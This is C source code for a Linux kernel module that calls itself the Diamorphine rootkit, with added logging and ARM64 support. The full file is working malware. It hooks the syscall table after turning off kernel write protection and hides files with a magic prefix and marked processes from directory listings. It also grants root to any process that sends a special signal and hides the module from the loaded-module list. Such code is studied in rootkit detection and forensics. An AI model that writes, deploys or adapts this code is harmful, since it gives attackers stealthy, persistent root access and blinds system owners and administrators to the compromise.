#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "diamorphine.h"

/* Log level definition */
int log_level = LOG_LEVEL_INFO;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
                            phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif
static unsigned long *__sys_call_table;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;
static t_syscall orig_kill;
#else
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
                                          unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
                                            struct linux_dirent64 *,
                                            unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;
#endif

unsigned long *get_syscall_table_bf(void) {
  LOG_FUNC_ENTRY();
  unsigned long *syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
  LOG_INFO("Using kallsyms_lookup_name method for syscall table discovery");
#ifdef KPROBE_LOOKUP
  LOG_DEBUG("Using kprobe method for kallsyms_lookup_name");
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
  kallsyms_lookup_name_t kallsyms_lookup_name;

  LOG_DEBUG("Registering kprobe for kallsyms_lookup_name");
  if (register_kprobe(&kp) < 0) {
    LOG_ERROR("Failed to register kprobe for kallsyms_lookup_name");
    LOG_FUNC_EXIT_RET(-1);
    return NULL;
  }
  kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
  LOG_DEBUG("kallsyms_lookup_name found at address: %p", kallsyms_lookup_name);
  unregister_kprobe(&kp);
  LOG_DEBUG("Unregistered kprobe");
#endif
  syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  if (syscall_table) {
    LOG_INFO("Successfully found sys_call_table at address: %p", syscall_table);
  } else {
    LOG_ERROR("Failed to find sys_call_table via kallsyms_lookup_name");
  }
  LOG_FUNC_EXIT();
  return syscall_table;
#else
  LOG_INFO("Using brute force method for syscall table discovery");
  unsigned long int i;
  int attempts = 0;

  for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
    attempts++;
    if (attempts % 1000000 == 0) {
      LOG_DEBUG("Brute force search attempt: %d, current address: 0x%lx",
                attempts, i);
    }
    syscall_table = (unsigned long *)i;

    if (syscall_table[__NR_close] == (unsigned long)sys_close) {
      LOG_INFO("Found sys_call_table via brute force at address: %p after %d "
               "attempts",
               syscall_table, attempts);
      LOG_FUNC_EXIT();
      return syscall_table;
    }
  }
  LOG_ERROR("Failed to find sys_call_table via brute force after %d attempts",
            attempts);
  LOG_FUNC_EXIT_RET(-1);
  return NULL;
#endif
}

struct task_struct *find_task(pid_t pid) {
  LOG_FUNC_ENTRY();
  LOG_DEBUG("Searching for task with PID: %d", pid);
  struct task_struct *p = current;
  int task_count = 0;

  for_each_process(p) {
    task_count++;
    if (p->pid == pid) {
      LOG_DEBUG("Found task with PID %d after checking %d tasks", pid,
                task_count);
      LOG_DEBUG("Task comm: %s", p->comm);
      LOG_FUNC_EXIT();
      return p;
    }
  }
  LOG_WARN("Task with PID %d not found after checking %d tasks", pid,
           task_count);
  LOG_FUNC_EXIT();
  return NULL;
}

int is_invisible(pid_t pid) {
  LOG_FUNC_ENTRY();
  LOG_DEBUG("Checking if PID %d is invisible", pid);
  struct task_struct *task;
  if (!pid) {
    LOG_DEBUG("PID is 0, returning not invisible");
    LOG_FUNC_EXIT_RET(0);
    return 0;
  }
  task = find_task(pid);
  if (!task) {
    LOG_DEBUG("Task not found for PID %d, returning not invisible", pid);
    LOG_FUNC_EXIT_RET(0);
    return 0;
  }
  if (task->flags & PF_INVISIBLE) {
    LOG_DEBUG("PID %d is invisible (flags: 0x%x)", pid, task->flags);
    LOG_FUNC_EXIT_RET(1);
    return 1;
  }
  LOG_DEBUG("PID %d is not invisible (flags: 0x%x)", pid, task->flags);
  LOG_FUNC_EXIT_RET(0);
  return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
  LOG_FUNC_ENTRY();
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  int fd = (int)pt_regs->di;
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  int fd = (int)pt_regs->regs[0];
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->regs[1];
#endif
  LOG_DEBUG("hacked_getdents64 called with fd=%d, dirent=%p", fd, dirent);
  int ret = orig_getdents64(pt_regs), err;
  LOG_DEBUG("Original getdents64 returned: %d", ret);
#else
asmlinkage int hacked_getdents64(unsigned int fd,
                                 struct linux_dirent64 __user *dirent,
                                 unsigned int count) {
  LOG_FUNC_ENTRY();
  LOG_DEBUG("hacked_getdents64 called with fd=%d, dirent=%p, count=%d", fd,
            dirent, count);
  int ret = orig_getdents64(fd, dirent, count), err;
  LOG_DEBUG("Original getdents64 returned: %d", ret);
#endif
  unsigned short proc = 0;
  unsigned long off = 0;
  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
  struct inode *d_inode;

  if (ret <= 0) {
    LOG_DEBUG("getdents64 returned %d, no processing needed", ret);
    LOG_FUNC_EXIT_RET(ret);
    return ret;
  }

  LOG_DEBUG("Allocating %d bytes for kernel dirent buffer", ret);
  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL) {
    LOG_ERROR("Failed to allocate %d bytes for kernel dirent buffer", ret);
    LOG_FUNC_EXIT_RET(ret);
    return ret;
  }

  LOG_DEBUG("Copying %d bytes from user space", ret);
  err = copy_from_user(kdirent, dirent, ret);
  if (err) {
    LOG_ERROR("copy_from_user failed with error: %d", err);
    goto out;
  }

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
  LOG_DEBUG("Directory inode: ino=%lu, rdev=%d", d_inode->i_ino,
            d_inode->i_rdev);
  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
      /*&& MINOR(d_inode->i_rdev) == 1*/) {
    proc = 1;
    LOG_DEBUG("Detected /proc directory, enabling process hiding");
  } else {
    LOG_DEBUG("Regular directory, using file hiding");
  }

  LOG_DEBUG("Processing dirent entries, total size: %d", ret);
  int hidden_count = 0;
  while (off < ret) {
    dir = (void *)kdirent + off;
    LOG_DEBUG("Processing entry: name='%s', reclen=%d, off=%lu", dir->d_name,
              dir->d_reclen, off);

    if ((!proc &&
         (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) ||
        (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
      LOG_DEBUG("Hiding entry: '%s'", dir->d_name);
      hidden_count++;
      if (dir == kdirent) {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        LOG_DEBUG("Removed first entry, new size: %d", ret);
        continue;
      }
      prev->d_reclen += dir->d_reclen;
      LOG_DEBUG("Merged with previous entry, new reclen: %d", prev->d_reclen);
    } else {
      prev = dir;
    }
    off += dir->d_reclen;
  }
  LOG_INFO("Hidden %d entries, final size: %d", hidden_count, ret);
  LOG_DEBUG("Copying %d bytes back to user space", ret);
  err = copy_to_user(dirent, kdirent, ret);
  if (err) {
    LOG_ERROR("copy_to_user failed with error: %d", err);
    goto out;
  }
  LOG_DEBUG("Successfully copied data to user space");
out:
  LOG_DEBUG("Freeing kernel dirent buffer");
  kfree(kdirent);
  LOG_FUNC_EXIT_RET(ret);
  return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
  LOG_FUNC_ENTRY();
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  int fd = (int)pt_regs->di;
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  int fd = (int)pt_regs->regs[0];
  struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->regs[1];
#endif
  LOG_DEBUG("hacked_getdents called with fd=%d, dirent=%p", fd, dirent);
  int ret = orig_getdents(pt_regs), err;
  LOG_DEBUG("Original getdents returned: %d", ret);
#else
asmlinkage int hacked_getdents(unsigned int fd,
                               struct linux_dirent __user *dirent,
                               unsigned int count) {
  LOG_FUNC_ENTRY();
  LOG_DEBUG("hacked_getdents called with fd=%d, dirent=%p, count=%d", fd,
            dirent, count);
  int ret = orig_getdents(fd, dirent, count), err;
  LOG_DEBUG("Original getdents returned: %d", ret);
#endif
  unsigned short proc = 0;
  unsigned long off = 0;
  struct linux_dirent *dir, *kdirent, *prev = NULL;
  struct inode *d_inode;

  if (ret <= 0) {
    LOG_DEBUG("getdents returned %d, no processing needed", ret);
    LOG_FUNC_EXIT_RET(ret);
    return ret;
  }

  LOG_DEBUG("Allocating %d bytes for kernel dirent buffer", ret);
  kdirent = kzalloc(ret, GFP_KERNEL);
  if (kdirent == NULL) {
    LOG_ERROR("Failed to allocate %d bytes for kernel dirent buffer", ret);
    LOG_FUNC_EXIT_RET(ret);
    return ret;
  }

  LOG_DEBUG("Copying %d bytes from user space", ret);
  err = copy_from_user(kdirent, dirent, ret);
  if (err) {
    LOG_ERROR("copy_from_user failed with error: %d", err);
    goto out;
  }

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

  LOG_DEBUG("Directory inode: ino=%lu, rdev=%d", d_inode->i_ino,
            d_inode->i_rdev);
  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
      /*&& MINOR(d_inode->i_rdev) == 1*/) {
    proc = 1;
    LOG_DEBUG("Detected /proc directory, enabling process hiding");
  } else {
    LOG_DEBUG("Regular directory, using file hiding");
  }

  LOG_DEBUG("Processing dirent entries, total size: %d", ret);
  int hidden_count = 0;
  while (off < ret) {
    dir = (void *)kdirent + off;
    LOG_DEBUG("Processing entry: name='%s', reclen=%d, off=%lu", dir->d_name,
              dir->d_reclen, off);

    if ((!proc &&
         (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) ||
        (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
      LOG_DEBUG("Hiding entry: '%s'", dir->d_name);
      hidden_count++;
      if (dir == kdirent) {
        ret -= dir->d_reclen;
        memmove(dir, (void *)dir + dir->d_reclen, ret);
        LOG_DEBUG("Removed first entry, new size: %d", ret);
        continue;
      }
      prev->d_reclen += dir->d_reclen;
      LOG_DEBUG("Merged with previous entry, new reclen: %d", prev->d_reclen);
    } else {
      prev = dir;
    }
    off += dir->d_reclen;
  }
  LOG_INFO("Hidden %d entries, final size: %d", hidden_count, ret);
  LOG_DEBUG("Copying %d bytes back to user space", ret);
  err = copy_to_user(dirent, kdirent, ret);
  if (err) {
    LOG_ERROR("copy_to_user failed with error: %d", err);
    goto out;
  }
  LOG_DEBUG("Successfully copied data to user space");
out:
  LOG_DEBUG("Freeing kernel dirent buffer");
  kfree(kdirent);
  LOG_FUNC_EXIT_RET(ret);
  return ret;
}

void give_root(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Attempting to give root privileges to current process (PID: %d)",
           current->pid);

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
  LOG_DEBUG("Using legacy credential modification method");
  current->uid = current->gid = 0;
  current->euid = current->egid = 0;
  current->suid = current->sgid = 0;
  current->fsuid = current->fsgid = 0;
  LOG_INFO("Successfully granted root privileges using legacy method");
#else
  LOG_DEBUG("Using modern credential modification method");
  struct cred *newcreds;
  newcreds = prepare_creds();
  if (newcreds == NULL) {
    LOG_ERROR("Failed to prepare new credentials");
    LOG_FUNC_EXIT();
    return;
  }
  LOG_DEBUG("Prepared new credentials at address: %p", newcreds);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) &&                           \
        defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) ||                           \
    LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
  LOG_DEBUG("Using strict type checks for UID/GID");
  newcreds->uid.val = newcreds->gid.val = 0;
  newcreds->euid.val = newcreds->egid.val = 0;
  newcreds->suid.val = newcreds->sgid.val = 0;
  newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
  LOG_DEBUG("Using standard UID/GID assignment");
  newcreds->uid = newcreds->gid = 0;
  newcreds->euid = newcreds->egid = 0;
  newcreds->suid = newcreds->sgid = 0;
  newcreds->fsuid = newcreds->fsgid = 0;
#endif
  LOG_DEBUG("Set all UIDs and GIDs to 0 (root)");
  commit_creds(newcreds);
  LOG_INFO("Successfully committed new root credentials");
#endif
  LOG_FUNC_EXIT();
}

static inline void tidy(void) {
  LOG_FUNC_ENTRY();
  LOG_DEBUG("Cleaning up module section attributes");
  if (THIS_MODULE->sect_attrs) {
    LOG_DEBUG("Freeing module section attributes at address: %p",
              THIS_MODULE->sect_attrs);
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    LOG_DEBUG("Module section attributes cleaned up");
  } else {
    LOG_DEBUG("No module section attributes to clean up");
  }
  LOG_FUNC_EXIT();
}

static struct list_head *module_previous;
static short module_hidden = 0;
void module_show(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Making module visible in module list");
  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);
  if (module_hidden) {
    LOG_DEBUG("Adding module back to module list at position: %p",
              module_previous);
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
    LOG_INFO("Module is now visible in module list");
  } else {
    LOG_DEBUG("Module is already visible, no action needed");
  }
  LOG_FUNC_EXIT();
}

void module_hide(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Hiding module from module list");
  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);
  if (!module_hidden) {
    module_previous = THIS_MODULE->list.prev;
    LOG_DEBUG("Stored previous module position: %p", module_previous);
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
    LOG_INFO("Module is now hidden from module list");
  } else {
    LOG_DEBUG("Module is already hidden, no action needed");
  }
  LOG_FUNC_EXIT();
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hacked_kill(const struct pt_regs *pt_regs) {
  LOG_FUNC_ENTRY();
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  pid_t pid = (pid_t)pt_regs->di;
  int sig = (int)pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
  pid_t pid = (pid_t)pt_regs->regs[0];
  int sig = (int)pt_regs->regs[1];
#endif
  LOG_DEBUG("hacked_kill called with pid=%d, signal=%d", pid, sig);
#else
asmlinkage int hacked_kill(pid_t pid, int sig) {
  LOG_FUNC_ENTRY();
  LOG_DEBUG("hacked_kill called with pid=%d, signal=%d", pid, sig);
#endif
  struct task_struct *task;
  switch (sig) {
  case SIGINVIS:
    LOG_INFO("Received SIGINVIS signal for PID %d", pid);
    if ((task = find_task(pid)) == NULL) {
      LOG_ERROR("Task with PID %d not found for SIGINVIS", pid);
      LOG_FUNC_EXIT_RET(-ESRCH);
      return -ESRCH;
    }
    if (task->flags & PF_INVISIBLE) {
      LOG_INFO("Making PID %d visible (removing PF_INVISIBLE flag)", pid);
      task->flags ^= PF_INVISIBLE;
    } else {
      LOG_INFO("Making PID %d invisible (adding PF_INVISIBLE flag)", pid);
      task->flags ^= PF_INVISIBLE;
    }
    LOG_DEBUG("PID %d flags after toggle: 0x%x", pid, task->flags);
    break;
  case SIGSUPER:
    LOG_INFO("Received SIGSUPER signal - granting root privileges");
    give_root();
    break;
  case SIGMODINVIS:
    LOG_INFO("Received SIGMODINVIS signal - toggling module visibility");
    if (module_hidden) {
      LOG_DEBUG("Module is currently hidden, making it visible");
      module_show();
    } else {
      LOG_DEBUG("Module is currently visible, hiding it");
      module_hide();
    }
    break;
  default:
    LOG_DEBUG("Standard kill signal %d, delegating to original handler", sig);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    LOG_FUNC_EXIT();
    return orig_kill(pt_regs);
#else
    LOG_FUNC_EXIT();
    return orig_kill(pid, sig);
#endif
  }
  LOG_INFO("Successfully processed special signal %d", sig);
  LOG_FUNC_EXIT_RET(0);
  return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void write_cr0_forced(unsigned long val) {
  LOG_DEBUG("Writing CR0 register with value: 0x%lx", val);
  unsigned long __force_order;

  asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
  LOG_DEBUG("CR0 register written successfully");
}
#endif

static inline void protect_memory(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Protecting memory from write access");
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  LOG_DEBUG("Using x86/x86_64 memory protection (CR0: 0x%lx)", cr0);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
  write_cr0_forced(cr0);
#else
  write_cr0(cr0);
#endif
  LOG_INFO("Memory protection enabled via CR0 register");
#elif IS_ENABLED(CONFIG_ARM64)
  LOG_DEBUG("Using ARM64 memory protection");
  LOG_DEBUG("Updating mapping protection: phys=0x%lx, virt=0x%lx, size=0x%lx",
            __pa_symbol(start_rodata), (unsigned long)start_rodata,
            section_size);
  update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
                      section_size, PAGE_KERNEL_RO);
  LOG_INFO("Memory protection enabled via ARM64 mapping update");
#endif
  LOG_FUNC_EXIT();
}

static inline void unprotect_memory(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Disabling memory write protection");
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  unsigned long new_cr0 = cr0 & ~0x00010000;
  LOG_DEBUG("Using x86/x86_64 memory unprotection (CR0: 0x%lx -> 0x%lx)", cr0,
            new_cr0);
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
  write_cr0_forced(new_cr0);
#else
  write_cr0(new_cr0);
#endif
  LOG_INFO("Memory write protection disabled via CR0 register");
#elif IS_ENABLED(CONFIG_ARM64)
  LOG_DEBUG("Using ARM64 memory unprotection");
  LOG_DEBUG("Updating mapping protection: phys=0x%lx, virt=0x%lx, size=0x%lx",
            __pa_symbol(start_rodata), (unsigned long)start_rodata,
            section_size);
  update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
                      section_size, PAGE_KERNEL);
  LOG_INFO("Memory write protection disabled via ARM64 mapping update");
#endif
  LOG_FUNC_EXIT();
}

static int __init diamorphine_init(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Initializing Diamorphine rootkit module");
  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);

  LOG_DEBUG("Attempting to locate syscall table");
  __sys_call_table = get_syscall_table_bf();
  if (!__sys_call_table) {
    LOG_ERROR("Failed to locate syscall table - module initialization failed");
    LOG_FUNC_EXIT_RET(-1);
    return -1;
  }
  LOG_INFO("Successfully located syscall table at address: %p",
           __sys_call_table);

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
  LOG_DEBUG("Reading CR0 register for x86/x86_64");
  cr0 = read_cr0();
  LOG_DEBUG("CR0 register value: 0x%lx", cr0);
#elif IS_ENABLED(CONFIG_ARM64)
  LOG_DEBUG("Setting up ARM64 memory protection functions");
  update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
  if (!update_mapping_prot) {
    LOG_ERROR("Failed to locate update_mapping_prot function");
    LOG_FUNC_EXIT_RET(-1);
    return -1;
  }
  LOG_DEBUG("update_mapping_prot found at: %p", update_mapping_prot);

  start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
  if (!start_rodata) {
    LOG_ERROR("Failed to locate __start_rodata symbol");
    LOG_FUNC_EXIT_RET(-1);
    return -1;
  }
  LOG_DEBUG("__start_rodata found at: 0x%lx", start_rodata);

  init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
  if (!init_begin) {
    LOG_ERROR("Failed to locate __init_begin symbol");
    LOG_FUNC_EXIT_RET(-1);
    return -1;
  }
  LOG_DEBUG("__init_begin found at: 0x%lx", init_begin);
  LOG_DEBUG("Section size: 0x%lx", section_size);
#endif

  LOG_DEBUG("Hiding module from module list");
  module_hide();

  LOG_DEBUG("Cleaning up module attributes");
  tidy();

  LOG_DEBUG("Storing original syscall handlers");
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
  orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
  orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
  orig_kill = (t_syscall)__sys_call_table[__NR_kill];
  LOG_DEBUG(
      "Original handlers (new format): getdents=%p, getdents64=%p, kill=%p",
      orig_getdents, orig_getdents64, orig_kill);
#else
  orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
  orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
  orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
  LOG_DEBUG(
      "Original handlers (legacy format): getdents=%p, getdents64=%p, kill=%p",
      orig_getdents, orig_getdents64, orig_kill);
#endif

  LOG_DEBUG("Disabling memory protection to modify syscall table");
  unprotect_memory();

  LOG_INFO("Installing syscall hooks");
  __sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
  __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
  __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
  LOG_INFO("Syscall hooks installed successfully");

  LOG_DEBUG("Re-enabling memory protection");
  protect_memory();

  LOG_INFO("Diamorphine rootkit module initialized successfully");
  LOG_FUNC_EXIT_RET(0);
  return 0;
}

static void __exit diamorphine_cleanup(void) {
  LOG_FUNC_ENTRY();
  LOG_INFO("Cleaning up Diamorphine rootkit module");
  LOG_DEBUG("Module address: %p, name: %s", THIS_MODULE, THIS_MODULE->name);

  LOG_DEBUG("Disabling memory protection to restore syscall table");
  unprotect_memory();

  LOG_INFO("Restoring original syscall handlers");
  __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
  __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
  __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
  LOG_INFO("Original syscall handlers restored");

  LOG_DEBUG("Re-enabling memory protection");
  protect_memory();

  LOG_INFO("Diamorphine rootkit module cleanup completed");
  LOG_FUNC_EXIT();
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("m0nad");
MODULE_DESCRIPTION("LKM rootkit with extensive logging");

/* Log level can be modified at runtime by changing the log_level variable */
/* Available levels: LOG_LEVEL_ERROR (0), LOG_LEVEL_WARN (1), LOG_LEVEL_INFO
 * (2), LOG_LEVEL_DEBUG (3) */
